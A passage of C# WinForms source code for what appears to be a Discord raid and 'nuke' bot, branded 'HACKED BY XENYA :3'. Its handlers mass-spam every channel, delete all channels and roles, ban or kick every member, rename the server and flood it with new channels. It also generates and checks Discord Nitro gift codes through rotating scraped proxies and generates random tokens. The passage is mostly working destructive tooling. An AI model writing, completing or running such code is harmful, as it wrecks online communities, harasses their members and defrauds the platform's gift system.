                                    var splitter = Strings.Split(messages, " ");
                                    if (Information.IsNumeric(splitter[0]))
                                    {
                                        for (int i = 0, loopTo19 = int.Parse(splitter[0]) - 1; i <= loopTo19; i++)
                                        {
                                            foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                            {
                                                try
                                                {
                                                    await textChannelino.SendMessageAsync(splitter[1]);
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }

                                        return;
                                    }
                                    else if (Information.IsNumeric(metroTextBox34.Text))
                                    {
                                        for (int i = 0, loopTo20 = int.Parse(metroTextBox34.Text) - 1; i <= loopTo20; i++)
                                        {
                                            foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                            {
                                                try
                                                {
                                                    await textChannelino.SendMessageAsync(messages);
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.SendMessageAsync(messages);
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                }

                                if (!Information.IsNumeric(messages))
                                {
                                    if (Information.IsNumeric(metroTextBox34.Text))
                                    {
                                        for (int i = 0, loopTo21 = int.Parse(metroTextBox34.Text) - 1; i <= loopTo21; i++)
                                        {
                                            foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                            {
                                                try
                                                {
                                                    await textChannelino.SendMessageAsync(messages);
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.SendMessageAsync(messages);
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    for (int i = 0, loopTo22 = int.Parse(messages) - 1; i <= loopTo22; i++)
                                    {
                                        if (!(metroTextBox27.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                            {
                                                try
                                                {
                                                    await textChannelino.SendMessageAsync(metroTextBox27.Text);
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                        else
                                        {
                                            foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                            {
                                                try
                                                {
                                                    await textChannelino.SendMessageAsync("@everyone HACKED BY Xenya :3");
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "msgspam" && metroCheckBox22.Checked)
                        {
                            try
                            {
                                int num = 1;
                                if (Information.IsNumeric(metroTextBox34.Text))
                                {
                                    num = int.Parse(metroTextBox34.Text);
                                }

                                string name = "@everyone HACKED BY XENYA :3";
                                if (!(metroTextBox27.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    name = metroTextBox27.Text;
                                }

                                for (int i = 0, loopTo23 = num - 1; i <= loopTo23; i++)
                                {
                                    foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                    {
                                        try
                                        {
                                            await textChannelino.SendMessageAsync(name);
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("lag ") && metroCheckBox23.Checked)
                        {
                            try
                            {
                                int lagMessages = 1;
                                string otherMessage = GetOtherMessage(theCommand, "lag ");
                                if (Information.IsNumeric(otherMessage))
                                {
                                    lagMessages = int.Parse(otherMessage);
                                }
                                else if (Information.IsNumeric(metroTextBox35.Text))
                                {
                                    lagMessages = int.Parse(metroTextBox35.Text);
                                }

                                for (int i = 0, loopTo24 = lagMessages - 1; i <= loopTo24; i++)
                                {
                                    foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                    {
                                        try
                                        {
                                            await textChannelino.SendMessageAsync(Utils.GetLagString());
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "lag" && metroCheckBox23.Checked)
                        {
                            try
                            {
                                int lagMessages = 1;
                                if (Information.IsNumeric(metroTextBox35.Text))
                                {
                                    lagMessages = int.Parse(metroTextBox35.Text);
                                }

                                for (int i = 0, loopTo25 = lagMessages - 1; i <= loopTo25; i++)
                                {
                                    foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                    {
                                        try
                                        {
                                            await textChannelino.SendMessageAsync(Utils.GetLagString());
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "nuke" && metroCheckBox24.Checked)
                        {
                            try
                            {
                                if (metroCheckBox29.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox30.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                                        {
                                            try
                                            {
                                                await voiceChannel.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox31.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketGuildChannel channelino in guild.Channels)
                                        {
                                            try
                                            {
                                                await channelino.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox32.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketGuildUser userino in guild.Users)
                                        {
                                            try
                                            {
                                                await guild.AddBanAsync(userino, 7, metroTextBox36.Text);
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox33.Checked)
                                {
                                    try
                                    {
                                        Discord.Rest.RestTextChannel theChannel = guild.CreateTextChannelAsync(metroTextBox37.Text).Result;
                                        int messages = 16;
                                        if (!(metroTextBox38.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            if (Information.IsNumeric(metroTextBox38.Text))
                                            {
                                                messages = int.Parse(metroTextBox38.Text);
                                            }
                                        }

                                        for (int i = 0, loopTo26 = messages - 1; i <= loopTo26; i++)
                                        {
                                            string theString = Utils.GetLagString();
                                            theString = theString.Substring(0, theString.Length - 300);
                                            await theChannel.SendMessageAsync("@everyone" + Environment.NewLine + "HACKED BY XENYA :3" + Environment.NewLine + Environment.NewLine + theString);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "raid" && metroCheckBox25.Checked)
                        {
                            try
                            {
                                if (metroCheckBox34.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox35.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                                        {
                                            try
                                            {
                                                await voiceChannel.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox36.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketGuildChannel channelino in guild.Channels)
                                        {
                                            try
                                            {
                                                await channelino.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox37.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketGuildUser userino in guild.Users)
                                        {
                                            try
                                            {
                                                await guild.AddBanAsync(userino, 7, metroTextBox39.Text);
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox38.Checked)
                                {
                                    try
                                    {
                                        foreach (SocketRole role in guild.Roles)
                                        {
                                            try
                                            {
                                                await role.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox39.Checked)
                                {
                                    try
                                    {
                                        await guild.ModifyAsync(x => x.Name = metroTextBox40.Text);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox40.Checked)
                                {
                                    try
                                    {
                                        string theName = "hacked by xenya";
                                        if (!(metroTextBox41.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            theName = metroTextBox41.Text;
                                        }

                                        Discord.Rest.RestTextChannel theChannel = guild.CreateTextChannelAsync(theName).Result;
                                        int messages = 16;
                                        if (!(metroTextBox42.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            if (Information.IsNumeric(metroTextBox42.Text))
                                            {
                                                messages = int.Parse(metroTextBox42.Text);
                                            }
                                        }

                                        for (int i = 0, loopTo27 = messages; i <= loopTo27; i++)
                                        {
                                            string theString = Utils.GetLagString();
                                            theString = theString.Substring(0, theString.Length - 300);
                                            await theChannel.SendMessageAsync("@everyone" + Environment.NewLine + "HACKED BY XENYA :3" + Environment.NewLine + Environment.NewLine + theString);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                    if (metroCheckBox41.Checked)
                                    {
                                        try
                                        {
                                            string theName = "hacked by xenya";
                                            if (!(metroTextBox41.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                            {
                                                theName = metroTextBox41.Text;
                                            }

                                            foreach (char c in theName.ToCharArray())
                                            {
                                                try
                                                {
                                                    await guild.CreateTextChannelAsync(c.ToString());
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }

                                        try
                                        {
                                            int messages = 16;
                                            if (!(metroTextBox43.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                            {
                                                if (Information.IsNumeric(metroTextBox43.Text))
                                                {
                                                    messages = int.Parse(metroTextBox43.Text);
                                                }
                                            }

                                            for (int i = 0, loopTo28 = messages - 1; i <= loopTo28; i++)
                                            {
                                                foreach (SocketTextChannel textChanelino in guild.TextChannels)
                                                {
                                                    string theString = Utils.GetLagString();
                                                    theString = theString.Substring(0, theString.Length - 300);
                                                    try
                                                    {
                                                        await textChanelino.SendMessageAsync("@everyone" + Environment.NewLine + "HACKED BY XENYA :3" + Environment.NewLine + Environment.NewLine + theString);
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                    }
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }

                                if (metroCheckBox72.Checked)
                                {
                                    try
                                    {
                                        string defaultName = "hacked-by-xenya";
                                        int defaultChannels = 16;
                                        if (!(metroTextBox74.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            defaultName = metroTextBox74.Text;
                                        }
                                        if (Information.IsNumeric(metroTextBox75.Text))
                                        {
                                            defaultChannels = int.Parse(metroTextBox75.Text);
                                        }
                                        for (int i = 0; i < defaultChannels - 1; i++)
                                        {
                                            try
                                            {
                                                guild.CreateTextChannelAsync(defaultName);
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }

                                if (metroCheckBox71.Checked)
                                {
                                    try
                                    {
                                        int messages = 6;
                                        if (Information.IsNumeric(metroTextBox73.Text))
                                        {
                                            messages = int.Parse(metroTextBox73.Text);
                                        }
                                        foreach (SocketTextChannel textChannel1 in guild.TextChannels)
                                        {
                                            string theString = Utils.GetLagString();
                                            theString = theString.Substring(0, theString.Length - 320);
                                            await textChannel1.SendMessageAsync("@everyone" + Environment.NewLine + Environment.NewLine + "HACKED BY XENYA :3" + Environment.NewLine + Environment.NewLine + theString);
                                        }
                                    }
                                    catch (Exception ex)
                                    {

                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "delroles" && metroCheckBox26.Checked)
                        {
                            try
                            {
                                foreach (SocketRole role in guild.Roles)
                                {
                                    try
                                    {
                                        await role.DeleteAsync();
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "deltxt" && metroCheckBox27.Checked)
                        {
                            try
                            {
                                foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                {
                                    try
                                    {
                                        await textChannelino.DeleteAsync();
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "delvc" && metroCheckBox28.Checked)
                        {
                            try
                            {
                                foreach (SocketVoiceChannel voiceChannel in guild.VoiceChannels)
                                {
                                    try
                                    {
                                        await voiceChannel.DeleteAsync();
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "del" && metroCheckBox73.Checked)
                        {
                            try
                            {
                                await textChannel.DeleteAsync();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "topic" && metroCheckBox74.Checked)
                        {
                            try
                            {
                                string theString = "HACKED BY XENYA :3";
                                if (!(metroTextBox76.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    theString = metroTextBox76.Text;
                                }
                                foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                                {
                                    try
                                    {
                                        await socketTextChannel.ModifyAsync(x =>
                                        {
                                            x.Topic = theString;
                                        });
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("topic ") && metroCheckBox74.Checked)
                        {
                            string topic = GetOtherMessage(theCommand, "topic ");
                            foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                            {
                                try
                                {
                                    await socketTextChannel.ModifyAsync(x =>
                                    {
                                        x.Topic = topic;
                                    });
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                        else if (theCommandLower == "deltopic")
                        {
                            foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                            {
                                try
                                {
                                    await socketTextChannel.ModifyAsync(x =>
                                    {
                                        x.Topic = "";
                                    });
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    public string GetOtherMessage(string originalMessage, string theCommand)
    {
        return originalMessage.Substring(theCommand.Length, originalMessage.Length - theCommand.Length);
    }
    private void metroCheckBox48_Click(object sender, EventArgs e)
    {
        metroCheckBox49.Checked = false;
    }
    private void metroCheckBox49_Click(object sender, EventArgs e)
    {
        metroCheckBox48.Checked = false;
    }
    private void metroButton67_Click(object sender, EventArgs e)
    {
        try
        {
            metroTextBox52.Text = "";
            metroButton67.Enabled = false;
            nitroGenerator = new Thread(new ThreadStart(doNitroGenerator));
            nitroGenerator.Start();
            metroButton66.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton66_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton66.Enabled = false;
            nitroGenerator.Abort();
            metroButton67.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton68_Click(object sender, EventArgs e)
    {
        if (saveFileDialog2.ShowDialog() == DialogResult.OK)
        {
            System.IO.File.WriteAllText(saveFileDialog2.FileName, metroTextBox52.Text);
        }
    }
    private void metroButton71_Click(object sender, EventArgs e)
    {
        try
        {
            metroTextBox53.Text = "";
            metroButton71.Enabled = false;
            tokenGenerator = new Thread(new ThreadStart(doTokenGenerator));
            tokenGenerator.Start();
            metroButton70.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton70_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton70.Enabled = false;
            tokenGenerator.Abort();
            metroButton71.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton69_Click(object sender, EventArgs e)
    {
        if (saveFileDialog2.ShowDialog() == DialogResult.OK)
        {
            System.IO.File.WriteAllText(saveFileDialog2.FileName, metroTextBox53.Text);
        }
    }
    private void metroButton72_Click(object sender, EventArgs e)
    {
        if (openFileDialog2.ShowDialog() == DialogResult.OK)
        {
            metroTextBox54.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
        }
    }
    private void metroButton73_Click(object sender, EventArgs e)
    {
        try
        {
            if (metroButton73.Text == "Check all Discord nitro codes")
            {
                metroTextBox55.Text = "";
                metroButton73.Text = "Stop checking all Discord nitro codes";
                nitroChecker = new Thread(new ThreadStart(doNitroChecker));
                nitroChecker.Start();
            }
            else
            {
                metroButton73.Text = "Check all Discord nitro codes";
                nitroChecker.Abort();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton74_Click(object sender, EventArgs e)
    {
        if (saveFileDialog2.ShowDialog() == DialogResult.OK)
        {
            System.IO.File.WriteAllText(saveFileDialog2.FileName, metroTextBox55.Text);
        }
    }
    public void doNitroGenerator()
    {
        try
        {
            if (metroRadioButton15.Checked)
            {
                while (true)
                {
                    if (metroCheckBox48.Checked)
                    {
                        if (metroTextBox52.Text == "")
                        {
                            metroTextBox52.Text = Utils.GetRandomNitroLink();
                        }
                        else
                        {
                            metroTextBox52.Text += Environment.NewLine + Utils.GetRandomNitroLink();
                        }
                    }
                    else
                    {
                        if (metroTextBox52.Text == "")
                        {
                            metroTextBox52.Text = Utils.GetRandomNitroCode();
                        }
                        else
                        {
                            metroTextBox52.Text += Environment.NewLine + Utils.GetRandomNitroCode();
                        }
                    }
                }
            }
            else
            {
                for (int i = 0; i < numericUpDown6.Value; i++)
                {
                    if (metroCheckBox48.Checked)
                    {
                        if (metroTextBox52.Text == "")
                        {
                            metroTextBox52.Text = Utils.GetRandomNitroLink();
                        }
                        else
                        {
                            metroTextBox52.Text += Environment.NewLine + Utils.GetRandomNitroLink();
                        }
                    }
                    else
                    {
                        if (metroTextBox52.Text == "")
                        {
                            metroTextBox52.Text = Utils.GetRandomNitroCode();
                        }
                        else
                        {
                            metroTextBox52.Text += Environment.NewLine + Utils.GetRandomNitroCode();
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
        metroButton66.Enabled = false;
        metroButton67.Enabled = true;
    }
    public void doTokenGenerator()
    {
        try
        {
            if (metroRadioButton18.Checked)
            {
                while (true)
                {
                    if (metroTextBox53.Text == "")
                    {
                        metroTextBox53.Text = Utils.GetRandomToken();
                    }
                    else
                    {
                        metroTextBox53.Text += Environment.NewLine + Utils.GetRandomToken();
                    }
                }
            }
            else
            {
                for (int i = 0; i < numericUpDown7.Value; i++)
                {
                    if (metroTextBox53.Text == "")
                    {
                        metroTextBox53.Text = Utils.GetRandomToken();
                    }
                    else
                    {
                        metroTextBox53.Text += Environment.NewLine + Utils.GetRandomToken();
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
        metroButton70.Enabled = false;
        metroButton71.Enabled = true;
    }
    public void doNitroChecker()
    {
        try
        {
            foreach (string line in metroTextBox54.Lines)
            {
                if (!(line.Replace(" ", "") == ""))
                {
                    string newLine = line;
                    if (newLine.StartsWith("https://discordapp.com/gifts/"))
                    {
                        newLine = newLine.Replace("https://discordapp.com/gifts/", "");
                    }
                    if (newLine.StartsWith("https://discord.com/gifts/"))
                    {
                        newLine = newLine.Replace("https://discord.com/gifts/", "");
                    }
                    if (metroCheckBox47.Checked)
                    {
                        try
                        {
                            string[] theProxy = GetRandomProxy();
                            if (Discord.REQ.Nitro.Check(newLine, theProxy[0], theProxy[1]))
                            {
                                if (metroTextBox55.Text == "")
                                {
                                    metroTextBox55.Text = line;
                                }
                                else
                                {
                                    metroTextBox55.Text += Environment.NewLine + line;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    else
                    {
                        try
                        {
                            if (Discord.REQ.Nitro.Check(newLine))
                            {
                                if (metroTextBox55.Text == "")
                                {
                                    metroTextBox55.Text = line;
                                }
                                else
                                {
                                    metroTextBox55.Text += Environment.NewLine + line;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
        metroButton73.Text = "Check all Discord nitro codes";
    }
    public void removeProxy()
    {
        try
        {
            IEProxy.DisableProxy();
        }
        catch (Exception ex)
        {
        }
    }
    public void setRandomProxy()
    {
        try
        {
            if (metroCheckBox47.Checked)
            {
                string[] theProxy = GetRandomProxy();
                IEProxy.SetProxy(theProxy[0] + ":" + theProxy[1]);
            }
        }
        catch (Exception ex)
        {
        }
    }
    public string[] GetRandomProxy()
    {
        try
        {
            if (metroCheckBox68.Checked)
            {
                System.Net.WebClient webClient = new System.Net.WebClient();
                TextBox textboxona = new TextBox();
                textboxona.Text = webClient.DownloadString("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes");
                return Strings.Split(textboxona.Lines[Utils.GetRandomNumber(0, textboxona.Lines.Length)], ":");
            }
            else
            {
                return Strings.Split(metroTextBox57.Lines[Utils.GetRandomNumber(0, metroTextBox57.Lines.Length)], ":");
            }
        }
        catch (Exception ex)
        {
        }
        return new string[] { };
    }
    private void metroCheckBox68_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox51.Enabled = !metroCheckBox68.Checked;
    }
    private void metroCheckBox61_Click(object sender, EventArgs e)
    {
        metroCheckBox62.Checked = false;
        numericUpDown14.Enabled = true;
    }
    private void metroCheckBox62_Click(object sender, EventArgs e)
    {
        metroCheckBox61.Checked = false;
        numericUpDown14.Enabled = false;
    }
    private void metroCheckBox63_Click(object sender, EventArgs e)
    {
        metroCheckBox64.Checked = false;
    }
    private void metroCheckBox64_Click(object sender, EventArgs e)
    {
        metroCheckBox63.Checked = false;
    }
    private void metroCheckBox50_Click(object sender, EventArgs e)
    {
        metroCheckBox51.Checked = false;
        metroTextBox65.Enabled = true;
    }
    private void metroCheckBox51_Click(object sender, EventArgs e)
    {
        metroCheckBox50.Checked = false;
        metroTextBox65.Enabled = false;
    }
    private void metroCheckBox52_Click(object sender, EventArgs e)
    {
        metroCheckBox53.Checked = false;
    }
    private void metroCheckBox53_Click(object sender, EventArgs e)
    {
        metroCheckBox52.Checked = false;
    }
    private void metroCheckBox57_Click(object sender, EventArgs e)
    {
        metroCheckBox58.Checked = false;
        metroTextBox68.Enabled = true;
    }
    private void metroCheckBox58_Click(object sender, EventArgs e)
    {
        metroCheckBox57.Checked = false;
        metroTextBox68.Enabled = false;
    }
    private void metroRadioButton31_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox71.Enabled = metroRadioButton31.Checked;
    }
    private void metroRadioButton21_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox67.Enabled = metroRadioButton21.Checked;
    }
    private async void metroButton88_Click(object sender, EventArgs e)
    {
        try
        {
            int j = 0;
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (Discord.Rest.RestBan restBan in theGuild.GetBansAsync().Result)
            {
                try
                {
                    if (j == listBox3.SelectedIndex)
                    {
                        try
                        {
                            await theGuild.RemoveBanAsync(restBan.User);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
                j++;
            }
            await Task.Delay(650);
            refreshBanned();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton87_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (Discord.Rest.RestBan restBan in theGuild.GetBansAsync().Result)
            {
                try
                {
                    await theGuild.RemoveBanAsync(restBan.User);
                }
                catch (Exception ex)
                {
                }
            }
            await Task.Delay(650);
            refreshBanned();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton90_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketGuildUser socketGuildUser in socketGuild.Users)
            {
                try
                {
                    foreach (SocketRole socketRole in socketGuild.Roles)
                    {
                        try
                        {
                            socketGuildUser.AddRoleAsync(socketRole);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton89_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketGuildUser socketGuildUser in socketGuild.Users)
            {
                try
                {
                    foreach (SocketRole socketRole in socketGuild.Roles)
                    {
                        try
                        {
                            socketGuildUser.RemoveRoleAsync(socketRole);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton92_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketGuildUser socketGuildUser in theGuild.Users)
            {
                try
                {
                    await socketGuildUser.KickAsync();
                }
                catch (Exception ex)
                {
                }
            }
            await Task.Delay(1200);
            refreshUsers();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton91_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketGuildUser socketGuildUser in theGuild.Users)
            {
                try
                {
                    await theGuild.AddBanAsync(socketGuildUser);
                }
                catch (Exception ex)
                {
                }
            }
            await Task.Delay(1200);
            refreshUsers();
            refreshBanned();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton93_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            SocketGuildUser socketGuildUser = getIndexedUser(theGuild, listBox4.SelectedIndex);
            foreach (SocketRole socketRole in theGuild.Roles)
            {
                try
                {
                    socketGuildUser.RemoveRoleAsync(socketRole);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton95_Click(object sender, EventArgs e)
    {
        try
        {
            Clipboard.SetText(getIndexedUser(getIndexedGuild(metroComboBox3.SelectedIndex), listBox4.SelectedIndex).Id.ToString());
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton94_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            SocketGuildUser socketGuildUser = getIndexedUser(socketGuild, listBox4.SelectedIndex);
            foreach (SocketRole socketRole in socketGuild.Roles)
            {
                try
                {
                    socketGuildUser.AddRoleAsync(socketRole);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton96_Click(object sender, EventArgs e)
    {
        try
        {
            await getIndexedUser(getIndexedGuild(metroComboBox3.SelectedIndex), listBox4.SelectedIndex).KickAsync();
            await Task.Delay(1200);
            refreshBanned();
            refreshUsers();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton97_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            await socketGuild.AddBanAsync(getIndexedUser(socketGuild, listBox4.SelectedIndex));
            await Task.Delay(1200);
            refreshBanned();
            refreshUsers();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton99_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            try
            {
                GuildPermissions all = GuildPermissions.All;
                await socketGuild.CreateRoleAsync("*", new GuildPermissions?(all), null, false, null);
            }
            catch (Exception ex)
            {
            }
            await Task.Delay(1200);
            refreshRoles();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton98_Click(object sender, EventArgs e)
    {
        try
        {
            int j = 0;
            SocketGuild socketGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketRole socketRole in socketGuild.Roles)
            {
                if (j == listBox5.SelectedIndex)
                {
                    await socketRole.DeleteAsync();
                }
                j++;
            }
            await Task.Delay(1200);
            refreshRoles();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroComboBox3_SelectedIndexChanged(object sender, EventArgs e)
    {
        try
        {
            refreshBanned();
            refreshUsers();
            refreshRoles();
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton100_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild theGuild = getIndexedGuild(metroComboBox3.SelectedIndex);
            foreach (SocketRole socketRole in theGuild.Roles)
            {
                try
                {
                    await socketRole.DeleteAsync();
                }
                catch (Exception ex)
                {
                }
            }
            await Task.Delay(1200);
            refreshRoles();
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshBanned()
    {
        try
        {
            listBox3.Items.Clear();
            foreach (Discord.Rest.RestBan restBan in getIndexedGuild(metroComboBox3.SelectedIndex).GetBansAsync().Result)
            {
                try
                {
                    listBox3.Items.Add(restBan.User.Username + "#" + restBan.User.Discriminator);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshUsers()
    {
        try
        {
            listBox4.Items.Clear();
            foreach (SocketGuildUser socketGuildUser in getIndexedGuild(metroComboBox3.SelectedIndex).Users)
            {
                try
                {
                    listBox4.Items.Add(socketGuildUser.Username + "#" + socketGuildUser.Discriminator);
